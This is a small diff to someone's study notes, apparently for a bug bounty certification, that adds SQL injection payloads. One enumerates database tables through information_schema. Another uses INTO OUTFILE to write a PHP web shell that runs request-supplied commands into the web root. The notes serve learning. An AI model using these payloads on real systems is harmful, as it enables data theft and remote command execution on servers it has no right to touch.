@@ -26,4 +26,10 @@ Stuff for CBBH
     % : Starts with (used in mysql)
 
     ')+or+id=4--+-
+
+    Database enumeration
+    '+union+select+1,group_concat(table_name),3,4+from+information_schema.tables--+-
+
+    Writing files
+    '+union+select+null,null,null,"<?php+system($_REQUEST['cmd']);?>"+into+outfile+"/var/www/html/blah2.php"--+-
   
